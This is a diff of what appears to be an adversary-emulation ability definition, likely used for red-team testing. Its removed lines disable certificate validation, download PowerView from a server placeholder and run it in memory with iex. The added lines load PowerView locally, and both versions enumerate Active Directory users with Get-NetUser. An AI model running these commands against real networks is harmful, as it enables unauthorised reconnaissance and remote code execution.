@@ -10,8 +10,6 @@
   executors:
     windows:
       command: |
-        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
-        $web = (New-Object System.Net.WebClient)
-        $web.Headers.add("file","PowerView.ps1")
-        $result = $web.uploadString("#{server}/file/download","")
-        iex $result; Get-NetUser | ConvertTo-Json
+        Import-Module #{files}\PowerView.ps1 -Verbose -Force;
+        Get-NetUser | ConvertTo-Json
+      payload: PowerView.ps1
